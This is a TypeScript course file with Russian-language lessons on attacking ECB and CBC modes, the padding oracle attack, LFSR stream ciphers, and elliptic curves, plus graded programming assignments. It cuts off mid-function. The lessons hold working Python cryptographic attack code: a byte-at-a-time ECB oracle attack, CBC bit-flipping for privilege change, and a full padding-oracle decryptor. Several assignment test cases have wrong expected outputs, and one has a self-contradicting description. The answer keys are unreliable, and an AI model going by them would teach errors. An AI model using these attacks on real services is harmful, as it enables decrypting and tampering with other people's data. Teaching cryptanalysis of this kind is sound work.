// ============================================
// Infosec 11 — Информационная безопасность
// 20 уроков, ~70 часов
// Продвинутая криптография, веб-эксплуатация, бинарная эксплуатация, OSINT, CTF
// ============================================

export const infosec11Lessons = [
  // ──────────────────────────────────────────
  // УРОК 1: Атаки на ECB и CBC
  // ──────────────────────────────────────────
  {
    slug: 'ecb-cbc-attacks',
    title: 'Атаки на ECB и CBC',
    description: 'Детектирование ECB, bit-flipping в CBC, chosen-plaintext атаки',
    content: `# Атаки на режимы шифрования ECB и CBC

## Режимы блочного шифрования

Блочные шифры (AES, DES) работают с фиксированными блоками данных. **Режим шифрования** определяет, как обрабатываются несколько блоков.

### ECB (Electronic Codebook)

Каждый блок шифруется **независимо** одним и тем же ключом:

\`\`\`
C_i = E(K, P_i)
\`\`\`

**Критическая уязвимость**: одинаковые блоки открытого текста дают одинаковые блоки шифротекста. Это позволяет:
- Детектировать повторяющиеся данные
- Проводить подмену блоков
- Классический пример — «ECB Penguin» (шифрование изображения в ECB сохраняет контуры)

### CBC (Cipher Block Chaining)

Каждый блок XOR-ится с предыдущим шифротекстом перед шифрованием:

\`\`\`
C_i = E(K, P_i XOR C_{i-1})
P_i = D(K, C_i) XOR C_{i-1}
\`\`\`

## Детектирование ECB

Если в шифротексте есть **повторяющиеся 16-байтные блоки** — это ECB:

\`\`\`python
def detect_ecb(ciphertext: bytes, block_size: int = 16) -> bool:
    """Детектирует ECB по повторяющимся блокам."""
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))

# Пример: Cryptopals Challenge 8
# Среди нескольких шифротекстов найти зашифрованный в ECB
ciphertexts = [bytes.fromhex(line) for line in open('data.txt')]
for i, ct in enumerate(ciphertexts):
    if detect_ecb(ct):
        print(f"Строка {i} зашифрована в ECB!")
\`\`\`

## Chosen-Plaintext атака на ECB

Если мы можем добавлять свой текст к секрету и получать шифротекст, мы можем **побайтово** угадать секрет:

\`\`\`python
def ecb_oracle_attack(oracle_func, block_size=16):
    """
    oracle_func(data) шифрует: data + SECRET в ECB.
    Побайтово восстанавливаем SECRET.
    """
    known = b""
    for pos in range(block_size * 4):  # допустим секрет до 64 байт
        # Подбираем padding так, чтобы следующий неизвестный байт
        # оказался в конце блока
        pad_len = block_size - 1 - (pos % block_size)
        padding = b"A" * pad_len

        # Целевой блок
        target_block = pos // block_size
        target = oracle_func(padding)
        target_chunk = target[target_block*block_size:(target_block+1)*block_size]

        # Перебираем все возможные байты
        found = False
        for byte_val in range(256):
            test_input = padding + known + bytes([byte_val])
            result = oracle_func(test_input)
            if result[target_block*block_size:(target_block+1)*block_size] == target_chunk:
                known += bytes([byte_val])
                found = True
                break
        if not found:
            break
    return known
\`\`\`

## Bit-Flipping атака на CBC

В CBC расшифровка: \`P_i = D(K, C_i) XOR C_{i-1}\`. Изменяя бит в \`C_{i-1}\`, мы **напрямую** меняем соответствующий бит в \`P_i\`:

\`\`\`python
def cbc_bitflip(ciphertext: bytes, block_size: int,
                known_plain: bytes, target_plain: bytes,
                target_block: int) -> bytes:
    """
    Модифицирует шифротекст CBC для подмены открытого текста.
    target_block — номер блока, который хотим изменить.
    Модифицируем блок target_block - 1.
    """
    ct = bytearray(ciphertext)
    prev_block_start = (target_block - 1) * block_size
    for i in range(len(known_plain)):
        # XOR: убираем старый символ, вставляем новый
        ct[prev_block_start + i] ^= known_plain[i] ^ target_plain[i]
    return bytes(ct)

# Пример: подменяем "role=user" на "role=admin" (допустим role= во 2-м блоке)
# Модифицируем 1-й блок шифротекста
modified = cbc_bitflip(ciphertext, 16, b"user\\x00", b"admin", target_block=1)
\`\`\`

## CVE и реальные примеры

- **BEAST (CVE-2011-3389)** — chosen-plaintext атака на CBC в TLS 1.0
- **POODLE (CVE-2014-3566)** — padding oracle на CBC в SSL 3.0
- **Cryptopals Set 2** — серия задач на ECB/CBC атаки (challenges 11-16)`,
    duration: 55,
    assignments: [
      {
        title: 'Детектирование ECB и анализ блоков',
        description: 'Реализуйте функцию detect_ecb_score(hex_string), которая принимает hex-строку шифротекста и возвращает количество повторяющихся 16-байтных блоков. Если блоков-дубликатов нет — возвращает 0. Например, если блок встречается 3 раза, он даёт 2 повтора (3-1=2). Суммируйте повторы по всем уникальным блокам.',
        difficulty: 'hard' as const,
        starterCode: 'def detect_ecb_score(hex_string: str) -> int:\n    # hex_string — шифротекст в hex\n    # Верните количество повторяющихся 16-байтных блоков\n    pass\n\nt = int(input())\nfor _ in range(t):\n    print(detect_ecb_score(input().strip()))\n',
        testCases: [
          { input: '3\naabbccdd00112233aabbccdd00112233aabbccdd00112233\n0011223344556677889900aabbccddee\naabbccddaabbccddaabbccddaabbccddaabbccddaabbccddaabbccddaabbccdd', expectedOutput: '2\n0\n1', description: 'Первая строка: блок aabbccdd00112233 встречается 3 раза (2 повтора), вторая — без повторов, третья — блок повторяется дважды' },
          { input: '1\n00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', expectedOutput: '7', description: '8 одинаковых нулевых блоков = 7 повторов' },
          { input: '2\nabcdef01234567890abcdef012345678\nabcdef01234567890abcdef01234567890abcdef01234567890abcdef012345678', expectedOutput: '0\n3', description: 'Первая — 2 разных блока, вторая — блок повторяется 4 раза' },
        ],
        points: 25,
      },
      {
        title: 'Подсчёт уникальных блоков шифротекста',
        description: 'Реализуйте функцию count_unique_blocks(hex_string, block_size_bytes), которая принимает hex-строку и размер блока в байтах, и возвращает количество уникальных блоков. Если длина hex-строки не кратна block_size_bytes*2 — последний неполный блок тоже считается.',
        difficulty: 'easy' as const,
        starterCode: 'def count_unique_blocks(hex_string: str, block_size: int) -> int:\n    # hex_string — шифротекст в hex\n    # block_size — размер блока в байтах\n    # Верните количество уникальных блоков\n    pass\n\nt = int(input())\nfor _ in range(t):\n    line = input().split()\n    print(count_unique_blocks(line[0], int(line[1])))\n',
        testCases: [
          { input: '2\naabbccddaabbccdd 4\naabb0011aabb2233 2', expectedOutput: '1\n3', description: 'Первый: два одинаковых 4-байтных блока; второй: aabb, 0011, aabb, 2233 — 3 уникальных' },
          { input: '1\n00112233445566778899 4', expectedOutput: '3', description: '2 полных 4-байтных блока + неполный (8899) = 3 уникальных' },
        ],
        points: 10,
      },
      {
        title: 'Определение размера блока шифра',
        description: 'Реализуйте функцию detect_block_size(hex_ciphertexts), которая принимает список hex-строк шифротекстов и определяет наиболее вероятный размер блока (8 или 16 байт). Для каждого размера подсчитайте общее количество повторяющихся блоков по всем шифротекстам. Верните размер с большим количеством повторов. При равенстве — 16.',
        difficulty: 'easy' as const,
        starterCode: 'def detect_block_size(hex_ciphertexts: list) -> int:\n    # Определите размер блока по повторам\n    # Верните 8 или 16\n    pass\n\nn = int(input())\ntexts = [input().strip() for _ in range(n)]\nprint(detect_block_size(texts))\n',
        testCases: [
          { input: '2\naabbccddaabbccddaabbccddaabbccdd00112233001122330011223300112233\naabbccddaabbccddaabbccddaabbccdd', expectedOutput: '8', description: 'Повторы 8-байтных блоков явно выражены' },
          { input: '1\naabbccdd00112233aabbccdd00112233aabbccdd00112233', expectedOutput: '16', description: '16-байтный блок aabbccdd00112233 повторяется 3 раза' },
        ],
        points: 10,
      },
      {
        title: 'XOR двух hex-строк',
        description: 'Реализуйте функцию xor_hex(hex1, hex2), которая XOR-ит два hex-строки побайтово. Если строки разной длины — XOR только до длины короткой. Верните результат как hex-строку (lowercase). На вход: N пар строк.',
        difficulty: 'medium' as const,
        starterCode: 'def xor_hex(hex1: str, hex2: str) -> str:\n    # XOR двух hex-строк\n    # Верните результат в hex\n    pass\n\nn = int(input())\nfor _ in range(n):\n    a = input().strip()\n    b = input().strip()\n    print(xor_hex(a, b))\n',
        testCases: [
          { input: '2\naabbccdd\n11223344\nff00\n00ff', expectedOutput: 'bb99ff99\nffff', description: 'XOR побайтово: aa^11=bb, bb^22=99 и т.д.' },
          { input: '1\n4141414141\n0102030405', expectedOutput: '4043424544', description: 'ASCII "AAAAA" XOR [1,2,3,4,5]' },
          { input: '1\nff\n00ff', expectedOutput: 'ff', description: 'Разная длина — XOR до длины короткой' },
        ],
        points: 15,
      },
      {
        title: 'Симуляция CBC bit-flipping',
        description: 'Реализуйте функцию cbc_bitflip_byte(ct_hex, block_num, byte_pos, old_byte, new_byte). Она модифицирует один байт в шифротексте CBC (16-байтные блоки). Чтобы изменить байт в блоке block_num на позиции byte_pos с old_byte на new_byte — XOR-им байт в предыдущем блоке: ct[prev_block_start + byte_pos] ^= old_byte ^ new_byte. Верните модифицированный шифротекст в hex.',
        difficulty: 'medium' as const,
        starterCode: 'def cbc_bitflip_byte(ct_hex: str, block_num: int, byte_pos: int, old_byte: int, new_byte: int) -> str:\n    # ct_hex — шифротекст в hex (блоки по 16 байт)\n    # block_num — номер целевого блока (с 1)\n    # byte_pos — позиция байта внутри блока (с 0)\n    # old_byte, new_byte — старый и новый байт (0-255)\n    pass\n\nct = input().strip()\nparts = input().split()\nblock_num = int(parts[0])\nbyte_pos = int(parts[1])\nold_byte = int(parts[2])\nnew_byte = int(parts[3])\nprint(cbc_bitflip_byte(ct, block_num, byte_pos, old_byte, new_byte))\n',
        testCases: [
          { input: '00000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n1 0 0 255', expectedOutput: 'ff000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', description: 'Меняем байт 0 блока 1: XOR ct[0] ^= 0^255 = 0^ff = ff' },
          { input: '41414141414141414141414141414141bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n1 5 65 90', expectedOutput: '41414141411f4141414141414141414141bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb', description: 'Меняем байт 5 в блоке 1 с A(65) на Z(90)' },
          { input: 'aabbccdd00112233445566778899aabbccddeeff00112233445566778899aabb\n1 0 170 255', expectedOutput: '55bbccdd00112233445566778899aabbccddeeff00112233445566778899aabb', description: 'XOR: aa ^ (aa ^ ff) = aa ^ 55 = ff... байт 0 блока 0: aa^(170^255)=aa^55=ff → нет, aa^85=0x55' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 2: Padding Oracle Attack
  // ──────────────────────────────────────────
  {
    slug: 'padding-oracle-attack',
    title: 'Padding Oracle Attack',
    description: 'Полный разбор атаки, побайтовое восстановление открытого текста, практическая реализация',
    content: `# Padding Oracle Attack

## PKCS#7 Padding

Перед шифрованием в CBC блоки дополняются до нужного размера по стандарту **PKCS#7**:

- Если не хватает 1 байта → добавляем \`\\x01\`
- Если не хватает 2 байт → добавляем \`\\x02\\x02\`
- Если не хватает N байт → добавляем N байт со значением N
- Если блок полный → добавляем целый блок из \`\\x10\` (16 байт)

\`\`\`python
def pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len]) * pad_len

def pkcs7_unpad(data: bytes) -> bytes:
    pad_len = data[-1]
    if pad_len == 0 or pad_len > 16:
        raise ValueError("Invalid padding")
    if data[-pad_len:] != bytes([pad_len]) * pad_len:
        raise ValueError("Invalid padding")
    return data[:-pad_len]
\`\`\`

## Суть атаки

**Padding Oracle** — сервер сообщает, корректен ли padding после расшифровки. Два ответа: «padding ok» vs «padding error».

Зная лишь эту 1 бит информации, атакующий может **полностью расшифровать** шифротекст без ключа!

### Математика атаки

Расшифровка CBC: \`P_i = D(K, C_i) XOR C_{i-1}\`

Обозначим \`I_i = D(K, C_i)\` — промежуточное значение (intermediate).

Тогда: \`P_i = I_i XOR C_{i-1}\`

Если мы подставим **произвольный блок** \`C'\` вместо \`C_{i-1}\`:
\`P'_i = I_i XOR C'\`

Подбирая последний байт \`C'\` так, чтобы \`P'_i\` заканчивался на \`\\x01\` (валидный padding), мы узнаём \`I_i[15]\`:
\`I_i[15] = C'[15] XOR 0x01\`

## Пошаговый алгоритм

\`\`\`python
def padding_oracle_attack_block(oracle, prev_block: bytes, target_block: bytes,
                                 block_size: int = 16) -> bytes:
    """
    Расшифровывает один блок с помощью padding oracle.
    oracle(iv + ciphertext) -> True если padding корректен.
    """
    intermediate = bytearray(block_size)
    plaintext = bytearray(block_size)

    for byte_pos in range(block_size - 1, -1, -1):
        pad_value = block_size - byte_pos  # 1, 2, 3, ... 16

        # Формируем тестовый блок
        test_block = bytearray(block_size)
        # Устанавливаем уже известные байты
        for k in range(byte_pos + 1, block_size):
            test_block[k] = intermediate[k] ^ pad_value

        # Перебираем значения текущего байта
        for guess in range(256):
            test_block[byte_pos] = guess
            if oracle(bytes(test_block) + target_block):
                # Нашли! Вычисляем intermediate
                intermediate[byte_pos] = guess ^ pad_value
                plaintext[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                break

    return bytes(plaintext)
\`\`\`

## Полная атака на многоблочный шифротекст

\`\`\`python
def full_padding_oracle_attack(oracle, ciphertext: bytes, block_size: int = 16) -> bytes:
    """Расшифровывает весь шифротекст (IV + ciphertext)."""
    blocks = [ciphertext[i:i+block_size]
              for i in range(0, len(ciphertext), block_size)]
    plaintext = b""
    for i in range(1, len(blocks)):
        decrypted = padding_oracle_attack_block(
            oracle, blocks[i-1], blocks[i], block_size
        )
        plaintext += decrypted
    return pkcs7_unpad(plaintext)
\`\`\`

## Сложность атаки

- На один байт: максимум **256** запросов
- На один блок (16 байт): максимум **4096** запросов
- Это **экспоненциально быстрее** полного перебора ключа (2^128)

## Защита

- Использовать **authenticated encryption** (AES-GCM, ChaCha20-Poly1305)
- Проверять MAC **до** расшифровки (Encrypt-then-MAC)
- Не различать ошибки padding и MAC в ответах сервера

## Реальные CVE

- **CVE-2014-3566 (POODLE)** — padding oracle в SSL 3.0
- **CVE-2016-2107** — padding oracle в OpenSSL AES-NI CBC
- **CVE-2010-3332** — ASP.NET padding oracle (Rizzo & Duong)`,
    duration: 60,
    assignments: [
      {
        title: 'Реализация PKCS#7 и валидация padding',
        description: 'Реализуйте три функции: pkcs7_pad(data_hex, block_size) — дополняет данные (hex-строка) по PKCS#7 и возвращает hex; pkcs7_unpad(data_hex) — убирает padding и возвращает hex (или "ERROR" при невалидном padding); pkcs7_validate(data_hex) — возвращает "VALID" или "INVALID". На вход: первая строка — команда (pad/unpad/validate), вторая — hex-данные, третья (для pad) — размер блока.',
        difficulty: 'hard' as const,
        starterCode: 'def pkcs7_pad(data_hex: str, block_size: int) -> str:\n    pass\n\ndef pkcs7_unpad(data_hex: str) -> str:\n    pass\n\ndef pkcs7_validate(data_hex: str) -> str:\n    pass\n\ncmd = input().strip()\ndata = input().strip()\nif cmd == "pad":\n    bs = int(input().strip())\n    print(pkcs7_pad(data, bs))\nelif cmd == "unpad":\n    print(pkcs7_unpad(data))\nelse:\n    print(pkcs7_validate(data))\n',
        testCases: [
          { input: 'pad\n48656c6c6f\n16', expectedOutput: '48656c6c6f0b0b0b0b0b0b0b0b0b0b0b', description: '"Hello" (5 байт) + 11 байт padding 0x0b' },
          { input: 'unpad\n48656c6c6f0b0b0b0b0b0b0b0b0b0b0b', expectedOutput: '48656c6c6f', description: 'Убираем padding, получаем "Hello"' },
          { input: 'validate\n41424304040404', expectedOutput: 'VALID', description: '"ABC" + 4 байта 0x04 — валидный padding для блока 7' },
          { input: 'validate\n4142430405', expectedOutput: 'INVALID', description: 'Последний байт 05, но предпоследний не 05 — невалидно' },
        ],
        points: 25,
      },
      {
        title: 'Вычисление PKCS#7 padding-байта',
        description: 'Реализуйте функцию padding_byte(data_len, block_size), которая возвращает значение padding-байта по PKCS#7. Если data_len кратно block_size, нужен целый блок padding (значение = block_size). Иначе значение = block_size - (data_len % block_size).',
        difficulty: 'easy' as const,
        starterCode: 'def padding_byte(data_len: int, block_size: int) -> int:\n    # Верните значение padding-байта по PKCS#7\n    pass\n\nt = int(input())\nfor _ in range(t):\n    d, b = map(int, input().split())\n    print(padding_byte(d, b))\n',
        testCases: [
          { input: '3\n5 16\n16 16\n13 16', expectedOutput: '11\n16\n3', description: '5 байт → pad 11; 16 байт → целый блок 16; 13 байт → pad 3' },
          { input: '2\n0 8\n7 8', expectedOutput: '8\n1', description: '0 байт → целый блок 8; 7 байт → pad 1' },
        ],
        points: 10,
      },
      {
        title: 'Подсчёт длины данных после padding',
        description: 'Реализуйте функцию padded_length(data_len, block_size), которая возвращает длину данных после PKCS#7 padding. Результат всегда кратен block_size и строго больше data_len (если data_len кратна block_size, добавляется целый блок).',
        difficulty: 'easy' as const,
        starterCode: 'def padded_length(data_len: int, block_size: int) -> int:\n    # Верните длину данных после PKCS#7 padding\n    pass\n\nt = int(input())\nfor _ in range(t):\n    d, b = map(int, input().split())\n    print(padded_length(d, b))\n',
        testCases: [
          { input: '4\n5 16\n16 16\n0 8\n15 16', expectedOutput: '16\n32\n8\n16', description: '5→16, 16→32, 0→8, 15→16' },
          { input: '2\n32 16\n1 16', expectedOutput: '48\n16', description: '32→48 (кратна — добавляем блок), 1→16' },
        ],
        points: 10,
      },
      {
        title: 'Анализ padding oracle ответов',
        description: 'Реализуйте функцию analyze_oracle(responses), которая анализирует список ответов padding oracle. На вход: N строк, каждая содержит модифицированный байт (0-255) и ответ оракула (VALID/INVALID). Из всех байтов с ответом VALID найдите тот, который при XOR с номером позиции (заданным отдельно) даёт валидный ASCII (32-126). Выведите найденный символ. Если таких несколько — выведите с наименьшим кодом.',
        difficulty: 'medium' as const,
        starterCode: 'def analyze_oracle(valid_bytes: list, position: int) -> str:\n    # valid_bytes — список байтов, давших VALID\n    # position — номер позиции для XOR\n    # Верните символ (ASCII 32-126) или \"?\"\n    pass\n\nn = int(input())\nvalid = []\nfor _ in range(n):\n    parts = input().split()\n    if parts[1] == "VALID":\n        valid.append(int(parts[0]))\npos = int(input())\nprint(analyze_oracle(valid, pos))\n',
        testCases: [
          { input: '3\n97 VALID\n200 INVALID\n150 INVALID\n0', expectedOutput: 'a', description: '97 XOR 0 = 97 = "a"' },
          { input: '2\n70 VALID\n180 VALID\n2', expectedOutput: 'D', description: '70 XOR 2 = 68 = "D", 180 XOR 2 = 182 (вне ASCII) → "D"' },
          { input: '3\n65 VALID\n33 VALID\n100 INVALID\n0', expectedOutput: '!', description: '65=A(код 65), 33=!(код 33) → наименьший код 33 = "!"' },
        ],
        points: 15,
      },
      {
        title: 'Побайтовое восстановление через XOR с padding',
        description: 'Реализуйте функцию recover_byte(known_pad, ct_byte, original_pad_value). При padding oracle атаке мы нашли байт ct_byte, при котором padding валиден. Исходное значение открытого текста: ct_byte XOR original_pad_value XOR known_pad. На вход: T тестов, каждый — три числа. Выведите восстановленный байт и его символ (если ASCII 32-126, иначе ".").',
        difficulty: 'medium' as const,
        starterCode: 'def recover_byte(known_pad: int, ct_byte: int, pad_value: int) -> tuple:\n    # Восстановите байт открытого текста\n    # Верните (значение_байта, символ_или_точка)\n    pass\n\nt = int(input())\nfor _ in range(t):\n    kp, cb, pv = map(int, input().split())\n    val, ch = recover_byte(kp, cb, pv)\n    print(val, ch)\n',
        testCases: [
          { input: '3\n0 97 0\n1 66 1\n5 200 1', expectedOutput: '97 a\n66 B\n204 .', description: '0^97^0=97(a), 1^66^1=66(B), 5^200^1=204(не ASCII)' },
          { input: '2\n0 72 0\n0 101 0', expectedOutput: '72 H\n101 e', description: 'Прямой XOR: 72=H, 101=e' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 3: LFSR и потоковые шифры
  // ──────────────────────────────────────────
  {
    slug: 'lfsr-stream-ciphers',
    title: 'LFSR и потоковые шифры',
    description: 'Линейные регистры сдвига с обратной связью, генераторы псевдослучайных чисел, корреляционные атаки',
    content: `# LFSR и потоковые шифры

## Потоковые шифры

В отличие от блочных шифров, **потоковые** шифруют данные побитно/побайтно, XOR-я открытый текст с **потоком ключей** (keystream):

\`\`\`
C_i = P_i XOR K_i
\`\`\`

Безопасность полностью зависит от качества генератора keystream.

## LFSR — Linear Feedback Shift Register

**LFSR** — регистр сдвига с линейной обратной связью. Состоит из:
- **Состояние** — N бит (начальное заполнение = seed)
- **Полином обратной связи** — определяет, какие биты XOR-ятся для нового бита

### Пример: 4-битный LFSR

Полином: \`x^4 + x^3 + 1\` (отводы на позициях 4 и 3)

\`\`\`
Состояние: [1, 0, 1, 1]
Новый бит: state[3] XOR state[2] = 1 XOR 1 = 0
Сдвиг:     [0, 1, 0, 1] → выход: 1
\`\`\`

## Реализация LFSR на Python

\`\`\`python
class LFSR:
    def __init__(self, seed: list, taps: list):
        """
        seed: начальное состояние [b0, b1, ..., bn-1]
        taps: позиции отводов (0-индексированные)
        """
        self.state = seed[:]
        self.taps = taps
        self.size = len(seed)

    def clock(self) -> int:
        """Генерирует один бит."""
        output = self.state[-1]
        new_bit = 0
        for tap in self.taps:
            new_bit ^= self.state[tap]
        self.state = [new_bit] + self.state[:-1]
        return output

    def generate(self, n: int) -> list:
        """Генерирует n бит."""
        return [self.clock() for _ in range(n)]

# Пример: LFSR с полиномом x^4 + x + 1 (отводы 0 и 3)
lfsr = LFSR(seed=[1, 0, 1, 1], taps=[0, 3])
bits = lfsr.generate(15)
print(bits)  # Период = 2^4 - 1 = 15 для примитивного полинома
\`\`\`

## Свойства LFSR

- **Период**: максимум \`2^n - 1\` для примитивного полинома степени n
- **Линейность**: это и преимущество (простота), и слабость (предсказуемость)
- **Атака Берлекэмпа-Мэсси**: по \`2n\` битам выхода можно восстановить полином и состояние!

## Атака Берлекэмпа-Мэсси

\`\`\`python
def berlekamp_massey(bits: list) -> list:
    """
    Восстанавливает минимальный LFSR по выходной последовательности.
    Возвращает полином обратной связи.
    """
    n = len(bits)
    c = [0] * (n + 1)  # текущий полином
    b = [0] * (n + 1)  # предыдущий полином
    c[0] = 1
    b[0] = 1
    L = 0  # текущая длина LFSR
    m = 1  # сдвиг
    d_b = 1

    for k in range(n):
        # Вычисляем дискрепансию
        d = bits[k]
        for j in range(1, L + 1):
            d ^= c[j] & bits[k - j]

        if d == 0:
            m += 1
        elif 2 * L <= k:
            temp = c[:]
            for j in range(m, n + 1):
                c[j] ^= b[j - m]
            b = temp
            L = k + 1 - L
            d_b = d
            m = 1
        else:
            for j in range(m, n + 1):
                c[j] ^= b[j - m]
            m += 1

    return c[:L + 1], L
\`\`\`

## Комбинированные генераторы

Для усиления LFSR используют **нелинейные комбинации** нескольких регистров:

- **Geffe generator**: 3 LFSR, мультиплексирование
- **Shrinking generator**: 2 LFSR, один управляет выходом другого
- **A5/1** (GSM): 3 LFSR с тактированием по мажоритарному правилу

## Реальные потоковые шифры

| Шифр | Применение | Статус |
|------|-----------|--------|
| RC4 | TLS, WEP | Сломан, запрещён |
| A5/1 | GSM | Сломан |
| ChaCha20 | TLS 1.3, WireGuard | Безопасен |
| Salsa20 | NaCl | Безопасен |

## Уязвимость: повторное использование keystream

Если два сообщения шифруются одним keystream:
\`C1 XOR C2 = P1 XOR P2\` — утечка информации о открытых текстах!`,
    duration: 55,
    assignments: [
      {
        title: 'Реализация и взлом LFSR',
        description: 'Реализуйте LFSR и используйте его для шифрования/дешифрования. На вход: первая строка — seed (биты через пробел), вторая — taps (позиции через пробел, 0-индексированные), третья — количество бит для генерации N. Выведите N бит keystream через пробел. Затем на следующей строке дан открытый текст (биты через пробел) — выведите шифротекст (XOR с keystream).',
        difficulty: 'hard' as const,
        starterCode: 'class LFSR:\n    def __init__(self, seed, taps):\n        pass\n    def clock(self):\n        pass\n    def generate(self, n):\n        pass\n\nseed = list(map(int, input().split()))\ntaps = list(map(int, input().split()))\nn = int(input())\nlfsr = LFSR(seed, taps)\nkeystream = lfsr.generate(n)\nprint(" ".join(map(str, keystream)))\nplaintext = list(map(int, input().split()))\nprint(" ".join(str(p ^ k) for p, k in zip(plaintext, keystream)))\n',
        testCases: [
          { input: '1 0 1 1\n0 3\n8\n1 1 0 0 1 0 1 0', expectedOutput: '1 1 0 1 0 0 1 1\n0 0 0 1 1 0 0 1', description: 'LFSR(seed=[1,0,1,1], taps=[0,3]), 8 бит keystream, затем XOR' },
          { input: '1 1 1\n0 2\n7\n0 0 0 0 0 0 0', expectedOutput: '1 1 1 0 1 1 0\n1 1 1 0 1 1 0', description: '3-битный LFSR, период 7, XOR с нулями = keystream' },
          { input: '1 0 0 1\n0 1\n4\n1 0 1 0', expectedOutput: '1 0 0 1\n0 0 1 1', description: '4-битный LFSR с отводами [0,1]' },
        ],
        points: 25,
      },
      {
        title: 'XOR двух битовых строк',
        description: 'Реализуйте функцию xor_bits(bits1, bits2), которая XOR-ит две строки бит одинаковой длины. На вход: T тестов, каждый — две строки бит через пробел (без разделителей внутри). Выведите результат XOR.',
        difficulty: 'easy' as const,
        starterCode: 'def xor_bits(bits1: str, bits2: str) -> str:\n    # XOR двух строк бит\n    # Верните строку бит-результат\n    pass\n\nt = int(input())\nfor _ in range(t):\n    a, b = input().split()\n    print(xor_bits(a, b))\n',
        testCases: [
          { input: '3\n1010 0101\n1111 0000\n1100 1010', expectedOutput: '1111\n1111\n0110', description: '1010^0101=1111, 1111^0000=1111, 1100^1010=0110' },
          { input: '2\n00000000 11111111\n10101010 10101010', expectedOutput: '11111111\n00000000', description: '0^1=1 для всех, одинаковые дают нули' },
        ],
        points: 10,
      },
      {
        title: 'Вычисление XOR по позициям taps',
        description: 'Реализуйте функцию compute_feedback(state, taps). state — список бит (0/1), taps — список позиций. Функция возвращает XOR всех бит на указанных позициях. На вход: T тестов, каждый — state и taps на двух строках.',
        difficulty: 'easy' as const,
        starterCode: 'def compute_feedback(state: list, taps: list) -> int:\n    # Вычислите XOR бит на позициях taps\n    # Верните 0 или 1\n    pass\n\nt = int(input())\nfor _ in range(t):\n    state = list(map(int, input().split()))\n    taps = list(map(int, input().split()))\n    print(compute_feedback(state, taps))\n',
        testCases: [
          { input: '3\n1 0 1 1\n0 3\n1 1 0 0\n0 1\n0 0 0 0\n0 1 2 3', expectedOutput: '0\n0\n0', description: '1^1=0, 1^1=0, 0^0^0^0=0' },
          { input: '2\n1 0 1 0\n0 2\n1 1 1 1\n1 3', expectedOutput: '0\n0', description: '1^1=0, 1^1=0' },
        ],
        points: 10,
      },
      {
        title: 'Период LFSR',
        description: 'Реализуйте функцию lfsr_period(seed, taps), которая возвращает период LFSR — количество шагов до повторения начального состояния. Максимум проверяйте 2^len(seed) - 1 шагов. Если состояние не повторилось — верните -1.',
        difficulty: 'medium' as const,
        starterCode: 'def lfsr_period(seed: list, taps: list) -> int:\n    # Вычислите период LFSR\n    # Верните число шагов до возврата к seed\n    pass\n\nseed = list(map(int, input().split()))\ntaps = list(map(int, input().split()))\nprint(lfsr_period(seed, taps))\n',
        testCases: [
          { input: '1 1 1\n0 2', expectedOutput: '7', description: '3-битный LFSR с taps [0,2] — максимальный период 2^3-1=7' },
          { input: '1 0\n0 1', expectedOutput: '3', description: '2-битный LFSR: 10→11→01→10 — период 3' },
          { input: '1 0 0 1\n0 3', expectedOutput: '15', description: '4-битный LFSR с максимальным периодом 15' },
        ],
        points: 15,
      },
      {
        title: 'Атака known-plaintext на XOR-шифр',
        description: 'Если известен фрагмент открытого текста и соответствующий шифротекст (оба в виде бит), можно восстановить keystream: keystream = plaintext XOR ciphertext. На вход: plaintext (биты через пробел) и ciphertext (биты через пробел). Выведите восстановленный keystream.',
        difficulty: 'medium' as const,
        starterCode: 'def recover_keystream(plaintext: list, ciphertext: list) -> list:\n    # Восстановите keystream из known plaintext\n    pass\n\nplain = list(map(int, input().split()))\ncipher = list(map(int, input().split()))\nks = recover_keystream(plain, cipher)\nprint(" ".join(map(str, ks)))\n',
        testCases: [
          { input: '1 0 1 0 1 0 1 0\n0 1 0 1 0 1 0 1', expectedOutput: '1 1 1 1 1 1 1 1', description: 'Все биты различаются → keystream из единиц' },
          { input: '1 1 0 0\n1 0 1 1', expectedOutput: '0 1 1 1', description: '1^1=0, 1^0=1, 0^1=1, 0^1=1' },
          { input: '0 0 0 0 0\n1 0 1 0 1', expectedOutput: '1 0 1 0 1', description: 'XOR с нулями = сам шифротекст' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 4: Эллиптические кривые
  // ──────────────────────────────────────────
  {
    slug: 'elliptic-curve-crypto',
    title: 'Эллиптические кривые',
    description: 'Математика ECC, операции на кривых, ECDH, ECDSA, преимущества над RSA',
    content: `# Криптография на эллиптических кривых (ECC)

## Почему ECC?

| Уровень безопасности | RSA (бит) | ECC (бит) |
|---------------------|-----------|-----------|
| 80 бит | 1024 | 160 |
| 112 бит | 2048 | 224 |
| 128 бит | 3072 | 256 |
| 256 бит | 15360 | 512 |

ECC даёт **тот же уровень безопасности** при значительно меньших ключах.

## Математика эллиптических кривых

Эллиптическая кривая над конечным полем \`F_p\`:

\`\`\`
y² ≡ x³ + ax + b (mod p)
\`\`\`

При условии \`4a³ + 27b² ≠ 0 (mod p)\` (кривая не вырождена).

### Операции на кривой

**Сложение точек** P + Q = R:
1. Проводим прямую через P и Q
2. Она пересекает кривую в точке R'
3. Отражаем R' относительно оси X → получаем R

**Удвоение** P + P = 2P: касательная к кривой в точке P.

## Реализация на Python

\`\`\`python
def point_add(P, Q, a, p):
    """Сложение двух точек на эллиптической кривой y²=x³+ax+b mod p."""
    if P is None:
        return Q
    if Q is None:
        return P
    x1, y1 = P
    x2, y2 = Q

    if x1 == x2 and y1 != y2:
        return None  # точка на бесконечности

    if P == Q:
        # Удвоение: lambda = (3*x1² + a) / (2*y1) mod p
        lam = (3 * x1 * x1 + a) * pow(2 * y1, -1, p) % p
    else:
        # Сложение: lambda = (y2 - y1) / (x2 - x1) mod p
        lam = (y2 - y1) * pow(x2 - x1, -1, p) % p

    x3 = (lam * lam - x1 - x2) % p
    y3 = (lam * (x1 - x3) - y1) % p
